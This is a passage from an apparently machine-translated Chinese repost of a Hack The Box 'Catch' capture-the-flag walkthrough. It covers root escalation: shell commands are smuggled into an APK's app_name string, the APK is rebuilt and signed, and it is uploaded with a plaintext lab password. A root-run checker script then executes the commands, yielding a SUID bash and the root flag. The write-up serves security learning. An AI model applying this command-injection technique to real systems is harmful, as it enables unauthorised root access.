lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">脚本的最后一部分设置了它将使用的文件夹，然后在DROPBOX文件夹中找到的每个apk上循环执行上面的函数:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="0c32" class="nn kg iq nj b gy no np l nq nr">###################<br/># MDM CheckerV1.0 #<br/>###################<br/><br/>DROPBOX=/opt/mdm/apk_bin<br/>IN_FOLDER=/root/mdm/apk_bin<br/>OUT_FOLDER=/root/mdm/certified_apps<br/>PROCESS_BIN=/root/mdm/process_bin<br/><br/>for IN_APK_NAME in $DROPBOX/*.apk;do<br/>        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"<br/>        APK_NAME="$(openssl rand -hex 12).apk"<br/>        if [[ -L "$IN_APK_NAME" ]]; then<br/>                exit<br/>        else<br/>                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"<br/>        fi<br/>        sig_check $IN_FOLDER $APK_NAME<br/>        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN<br/>        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME<br/>done<br/>cleanup</span></pre><p id="2456" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所以我们需要做的总结是:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="14aa" class="nn kg iq nj b gy no np l nq nr">1. Edit the strings.xml file on Kali for the catchv1.0.apk we decompiled earlier.<br/>2. Put the commands we want to execute separated by a ;.<br/>3. Compile the apk.<br/>4. Sign it.<br/>5. Upload to the box in folder /opt/mdm/apk_bin.<br/>6. Wait for glory.</span></pre><h1 id="ab99" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">利用APK漏洞</h1><p id="430e" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">让我们开始吧。首先在您选择的编辑器中打开字符串文件:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a8f4" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch/catchv1.0]<br/>└─# nano res/values/strings.xml</span></pre><p id="b71b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">寻找这条线:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="9093" class="nn kg iq nj b gy no np l nq nr">&lt;string name="app_name"&gt;Catch&lt;/string&gt;</span></pre><p id="39d0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">将其更改为以下内容，或者您希望以root用户身份执行的任何内容:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="87ee" class="nn kg iq nj b gy no np l nq nr">&lt;string name="app_name"&gt;Catch999;cp /bin/bash /tmp/pencer; chmod +s /tmp/pencer&lt;/string&gt;</span></pre><p id="17e8" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">在这里，我将bash复制为root用户，修改权限，这样我就可以按照用户的意愿执行以获得root shell。</p><p id="adf4" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我使用了<a class="ae nt" href="https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82" rel="noopener">这个</a>指南来帮助我编译和签署我们的apk。</p><p id="928a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们使用apktool编译apk:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="071c" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# java -jar apktool_2.6.1.jar b -f -d /root/htb/catch/catchv1.0 -o /root/htb/catch/catch_pencer.apk                   <br/>I: Using Apktool 2.6.1<br/>I: Smaling smali folder into classes.dex...<br/>I: Building resources...<br/>I: Building apk file...<br/>I: Copying unknown files/dir...<br/>I: Built apk...</span></pre><p id="fd32" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">注意:这与Kali repo中apktool的最新版本不兼容。那个是2.5，你需要2.6.1才能工作，所以如果需要，从<a class="ae nt" href="https://apktool.en.lo4d.com/download" rel="noopener ugc nofollow" target="_blank">这里</a>抓取。</p><p id="6b76" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们需要签字。首先生成我们的密钥:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d014" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000<br/>Enter keystore password:  <br/>Re-enter new password: <br/>What is your first and last name?<br/>  [Unknown]:  1<br/>What is the name of your organizational unit?<br/>  [Unknown]:  1<br/>What is the name of your organization?<br/>  [Unknown]:  1<br/>What is the name of your City or Locality?<br/>  [Unknown]:  1<br/>What is the name of your State or Province?<br/>  [Unknown]:  1<br/>What is the two-letter country code for this unit?<br/>  [Unknown]:  us<br/>Is CN=1, OU=1, O=1, L=1, ST=1, C=us correct?<br/>  [no]:  yes<br/>Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days<br/>        for: CN=1, OU=1, O=1, L=1, ST=1, C=us<br/>[Storing my-release-key.keystore]</span></pre><p id="07c2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">然后用jarsigner签名，但是这里我遇到了一个问题，因为在Kali 2022.1中没有jarsigner。检查我们可以看到我们安装了java 11:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b1f5" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# update-alternatives --config java<br/>There is 1 choice for the alternative java (providing /usr/bin/java).<br/>Selection  Path                                   Priority   Status<br/>--------------------------------------------------------------------<br/>* 0    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111   auto mode<br/>  1    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111 manual mode</span></pre><p id="1d6a" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">jarsigner仍然不在那里，所以我安装了openjdk，它添加了更多的包:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="014f" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# apt-get install openjdk-11-jdk<br/>Reading package lists... Done<br/>Building dependency tree... Done<br/>Reading state information... Done<br/>The following additional packages will be installed:<br/>  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev<br/>Suggested packages:<br/>  libice-doc libsm-doc libx11-doc libxcb-doc libxt-doc openjdk-11-demo openjdk-11-source visualvm<br/>The following NEW packages will be installed:<br/>  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev<br/>0 upgraded, 13 newly installed, 0 to remove and 151 not upgraded.<br/>Need to get 223 MB of archives.<br/>After this operation, 239 MB of additional disk space will be used.<br/>Do you want to continue? [Y/n] y<br/>&lt;SNIP&gt;</span></pre><p id="b966" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我设置了手动模式的替代模式:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="65ae" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# update-alternatives --config java<br/>There is 1 choice for the alternative java (providing /usr/bin/java).<br/>Selection  Path                                   Priority   Status<br/>--------------------------------------------------------------------<br/>  0    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111   auto mode<br/>* 1    /usr/lib/jvm/java-11-openjdk-amd64/bin/java  1111 manual mode</span></pre><p id="0846" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在jarsigner可用了:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="cb24" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# jarsigner<br/>Usage: jarsigner [options] jar-file alias<br/>       jarsigner -verify [options] jar-file [alias...]<br/><br/>[-keystore &lt;url&gt;]           keystore location<br/>&lt;SNIP&gt;</span></pre><p id="af46" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">回到签署我们新建的apk:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b698" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catch_pencer.apk alias_name<br/>Enter Passphrase for keystore: <br/>   adding: META-INF/MANIFEST.MF<br/>   adding: META-INF/ALIAS_NA.SF<br/>   adding: META-INF/ALIAS_NA.RSA<br/>  signing: classes.dex<br/>  signing: AndroidManifest.xml<br/>  signing: resources.arsc<br/>  signing: res/animator/mtrl_extended_fab_show_motion_spec.xml<br/>&lt;SNIP&gt;</span></pre><p id="4dbb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们可以使用SCPto将文件复制到/opt/mdm/apk_bin文件夹中:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="b5d8" class="nn kg iq nj b gy no np l nq nr">┌──(root㉿kali)-[~/htb/catch]<br/>└─# sshpass -p 's2#4Fg0_%3!' scp catch_pencer.apk will@catch.htb:/opt/mdm/apk_bin</span></pre><p id="487b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">切换回我们的SSH会话，因为用户将在机器上。等待几分钟，然后检查/tmp:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="a0d8" class="nn kg iq nj b gy no np l nq nr">will@catch:~$ ll /tmp/pencer<br/>-rwsr-sr-x 1 root root 1183448 Apr 23 14:28 /tmp/pencer*</span></pre><h1 id="630d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="cde7" class="pw-post-body-paragraph lj lk iq ll b lm mx jr lo lp my ju lr ls mz lu lv lw na ly lz ma nb mc md me ij bi translated">我们的bash副本名为pencer，权限已修改。现在让我们来看看根标志:</p><pre class="ky kz la lb gt ni nj nk nl aw nm bi"><span id="d036" class="nn kg iq nj b gy no np l nq nr">will@catch:~$ /tmp/pencer -p<br/>pencer-5.0# whoami<br/>root<br/>pencer-5.0# cat /root/root.txt<br/>340847d2ddd0d39864d988d72c4658ee</span></pre><p id="0096" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">对我来说那是个相当棘手的盒子。我希望这个演练能帮助您度过难关。下次见。</p></div><div class="ab cl oh oi hu oj" role="separator"><span class="ok bw bk ol om on"/><span class="ok bw bk ol om on"/><span class="ok bw bk ol om"/></div><div class="ij ik il im in"><p id="2df0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="56e0" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae nt" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nt" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="4533" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oo">原载于2022年7月23日</em><a class="ae nt" href="https://pencer.io/ctf/ctf-htb-catch/" rel="noopener ugc nofollow" target="_blank"><em class="oo">https://pencer . io</em></a><em class="oo">。</em></p></div><div class="ab cl oh oi hu oj" role="separator"><span class="ok bw bk ol om on"/><span class="ok bw bk ol om on"/><span class="ok bw bk ol om"/></div><div class="ij ik il im in"><p id="49f9" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="oo">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。</em> <a class="ae nt" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="ll ir"> <em class="oo">加入我们的每周简讯</em> </strong> </a> <em class="oo">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>